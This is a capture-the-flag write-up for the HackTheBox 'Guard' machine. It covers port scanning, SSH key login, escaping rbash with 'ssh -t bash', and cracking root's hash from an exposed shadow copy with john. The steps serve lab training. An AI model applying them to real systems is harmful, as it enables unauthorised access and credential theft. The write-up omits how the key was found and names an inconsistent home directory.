---
description: Guard box from HackTheBox write up.
---

# Guard

## Nmap scan

As usual here it comes!

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 -v <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 15:16 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.037s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
           Raw packets sent: 65553 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22 -sC -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 15:17 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:64:23:e0:a7:ec:1d:3b:f0:63:72:a7:d7:05:57:71 (RSA)
|   256 b3:86:5d:3d:c9:d1:70:ea:d6:3d:36:a6:c5:f2:be:5d (ECDSA)
|_  256 c0:5b:13:0f:d6:e6:d1:71:2d:55:e2:4a:e2:27:0e:c2 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds
```

Only ssh open, that may be a problem but looks like we can just use the `daniel` user private key to login so we are in the box now!

## Scaping rbash

Once we establish a ssh connection we can see something... weird. The shell we have is really restricted and we can't even execute a simple `cat` welcome to Rbash!

Luckily, since we are using ssh to connect, we can try to get a normal Bash shell:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Guard]
└─$ ssh daniel@<MACHINE_IP> -i id_rsa -t bash
```

Now we can get the user flag under `/home/picasso/user.txt`.

## Privilege escalation

The `daniel` user is part of the `sudo` group but we don't know the password yet. After a while looking around I found a copy of the `shadow` file that we have access to. Let's try to crack the hashes!

Using `unshadow` to get a `john` compatible hash file from the `passwd` and `shadow` files we can get the `root` password using Rockyou:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Guard]
└─$ john hash.txt --wordlist=~/Tools/Wordlists/rockyou.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password#1       (root)
```

The root flag is under `/root/root.txt`.
